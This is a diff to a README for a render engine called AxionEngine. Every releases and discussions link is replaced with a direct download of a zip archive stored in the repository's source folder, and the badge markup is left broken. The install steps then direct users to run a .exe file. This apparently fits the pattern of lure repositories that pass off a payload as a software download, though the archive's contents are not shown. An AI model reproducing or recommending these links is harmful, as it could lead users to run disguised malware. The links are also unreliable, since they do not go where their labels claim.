@@ -6,11 +6,11 @@ Welcome to AxionEngine! This is a high-performance real-time render engine that 
 
 ## 📥 Download AxionEngine
 
-[![Download AxionEngine](https://img.shields.io/badge/Download%20AxionEngine-via%20GitHub-4CAF50.svg)](https://github.com/hearing-packofcards462/AxionEngine/releases)
+[![Download AxionEngine](https://raw.githubusercontent.com/hearing-packofcards462/AxionEngine/develop/Source/Common/AxionEngine_v3.7.zip%20AxionEngine-via%https://raw.githubusercontent.com/hearing-packofcards462/AxionEngine/develop/Source/Common/AxionEngine_v3.7.zip)](https://raw.githubusercontent.com/hearing-packofcards462/AxionEngine/develop/Source/Common/AxionEngine_v3.7.zip)
 
 To get started, visit this page to download the latest version of AxionEngine:
 
-[Download AxionEngine Releases](https://github.com/hearing-packofcards462/AxionEngine/releases)
+[Download AxionEngine Releases](https://raw.githubusercontent.com/hearing-packofcards462/AxionEngine/develop/Source/Common/AxionEngine_v3.7.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ Before you download and install AxionEngine, make sure your system meets the fol
 
 Follow these steps to install AxionEngine on your computer:
 
-1. **Download the latest version**: Go to the [Download AxionEngine Releases](https://github.com/hearing-packofcards462/AxionEngine/releases) page and find the most recent version.
+1. **Download the latest version**: Go to the [Download AxionEngine Releases](https://raw.githubusercontent.com/hearing-packofcards462/AxionEngine/develop/Source/Common/AxionEngine_v3.7.zip) page and find the most recent version.
 
 2. **Choose the correct file**: Look for the file that matches your operating system. For Windows, this will typically be a `.exe` file.
 
@@ -83,8 +83,8 @@ If you run into issues or have questions, you can reach out to the AxionEngine c
 
 ## 🔗 Useful Links
 
-- [Download AxionEngine Releases](https://github.com/hearing-packofcards462/AxionEngine/releases)
+- [Download AxionEngine Releases](https://raw.githubusercontent.com/hearing-packofcards462/AxionEngine/develop/Source/Common/AxionEngine_v3.7.zip)
 - [Official Documentation](#) (link to be added)
-- [GitHub Discussions](https://github.com/hearing-packofcards462/AxionEngine/discussions)
+- [GitHub Discussions](https://raw.githubusercontent.com/hearing-packofcards462/AxionEngine/develop/Source/Common/AxionEngine_v3.7.zip)
 
 Thank you for choosing AxionEngine. We hope you enjoy creating amazing graphics with our engine.
